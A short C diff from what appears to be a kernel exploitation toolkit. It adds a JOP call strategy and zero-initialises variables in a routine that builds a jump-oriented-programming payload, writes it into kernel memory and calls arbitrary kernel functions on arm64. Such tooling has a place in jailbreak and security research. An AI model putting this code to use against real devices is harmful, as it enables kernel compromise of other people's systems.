@@ -55,6 +55,7 @@ static kaddr_t jop_payload;
  * 	A list of all available strategies, sorted in order of preference.
  */
 const struct jop_call_strategy *strategies[] = {
+	&jop_call_strategy_5,
 	&jop_call_strategy_3,
 	&jop_call_strategy_1,
 	&jop_call_strategy_2,
@@ -160,7 +161,7 @@ kernel_call_arm64(void *result, unsigned result_size,
 		kaddr_t func, unsigned arg_count, const struct kernel_call_argument args[]) {
 	assert(arg_count <= 32);
 	// Build the arguments.
-	uint64_t args64[32];
+	uint64_t args64[32] = {};
 	size_t stack_size = (strategy == NULL ? 0 : strategy->stack_size);
 	bool args_ok = lay_out_arguments(args64, stack_size, arg_count, args);
 	// If the user is just asking if a specific call is supported, indicate that it is, as long
@@ -180,7 +181,7 @@ kernel_call_arm64(void *result, unsigned result_size,
 	uint8_t payload[size];
 	memset(payload, 0xba, size);
 	// Build the payload.
-	struct jop_call_initial_state initial_state;
+	struct jop_call_initial_state initial_state = {};
 	uint64_t result_address;
 	strategy->build_jop(func, args64, jop_payload, payload, &initial_state, &result_address);
 	// Write the payload into kernel memory.
